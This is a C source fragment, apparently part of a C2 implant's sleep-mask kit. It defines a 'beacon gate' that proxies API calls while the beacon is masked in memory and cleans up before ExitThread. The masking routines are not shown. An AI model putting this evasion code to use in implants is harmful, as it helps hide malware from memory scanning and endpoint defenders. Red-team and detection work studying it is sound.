/**
* Execute beacon gate.
*
* @param PFUNCTION_CALL functionCall - A ptr to a FUNCTION_CALL struct
*        which encapsulates the function call to be executed.
*/
void BeaconGate(PFUNCTION_CALL functionCall)
{
	ULONG_PTR retValue = 0;
	int i = 0;

	/* Debugging info for target function. */
	DLOG("beacon_gate: target function ptr: %p\n", functionCall->functionPtr);
	DLOG("beacon_gate: target function enum: %d\n", functionCall->function);
	DLOG("beacon_gate: numOfArgs: %d\n", functionCall->numOfArgs);
	for (i = 0; i < functionCall->numOfArgs; i++)
	{
		DLOG("beacon_gate: arg %d: %p\n", i, functionCall->args[i]);
	}

	/* Call appropriate function ptr based on number of args.*/
	/* NB This is not a switch statement because it adds linker errors. */
	if (functionCall->numOfArgs == 0)
	{
		retValue = beaconGate(00)();
	}
	else if (functionCall->numOfArgs == 1)
	{
		retValue = beaconGate(01)(arg(0));
	}
	else if (functionCall->numOfArgs == 2)
	{
		retValue = beaconGate(02)(arg(0), arg(1));
	}
	else if (functionCall->numOfArgs == 3)
	{
		retValue = beaconGate(03) (arg(0), arg(1), arg(2));
	}
	else if (functionCall->numOfArgs == 4)
	{
		retValue = beaconGate(04) (arg(0), arg(1), arg(2), arg(3));
	}
	else if (functionCall->numOfArgs == 5)
	{
		retValue = beaconGate(05) (arg(0), arg(1), arg(2), arg(3), arg(4));
	}
	else if (functionCall->numOfArgs == 6)
	{
		retValue = beaconGate(06) (arg(0), arg(1), arg(2), arg(3), arg(4), arg(5));
	}
	else if (functionCall->numOfArgs == 7)
	{
		retValue = beaconGate(07) (arg(0), arg(1), arg(2), arg(3), arg(4), arg(5), arg(6));
	}
	else if (functionCall->numOfArgs == 8)
	{
		retValue = beaconGate(08) (arg(0), arg(1), arg(2), arg(3), arg(4), arg(5), arg(6), arg(7));
	}
	else if (functionCall->numOfArgs == 9)
	{
		retValue = beaconGate(09) (arg(0), arg(1), arg(2), arg(3), arg(4), arg(5), arg(6), arg(7), arg(8));
	}
	else if (functionCall->numOfArgs == 10)
	{
		retValue = beaconGate(10) (arg(0), arg(1), arg(2), arg(3), arg(4), arg(5), arg(6), arg(7), arg(8), arg(9));
	}

	functionCall->retValue = retValue;

	return;
}

void beacon_gate_wrapper(PSLEEPMASK_INFO sleepMaskInfo, PFUNCTION_CALL functionCall) {

	if (functionCall->bMask) {
		DLOGT("beacon_gate: masking\n");
		mask_beacon(sleepMaskInfo);
	}

	/* Check for ExitThread function and perform cleanup first */
	if (functionCall->function == EXITTHREAD) {
		cleanup_allocate_memory(sleepMaskInfo);
	}

	/* Beacon is now masked, execute function call. */
	DLOGT("sleep_mask: use beacon gate\n");
	BeaconGate(functionCall);

	if (functionCall->bMask) {
		DLOGT("beacon_gate: unmasking\n");
		unmask_beacon(sleepMaskInfo);
	}
}
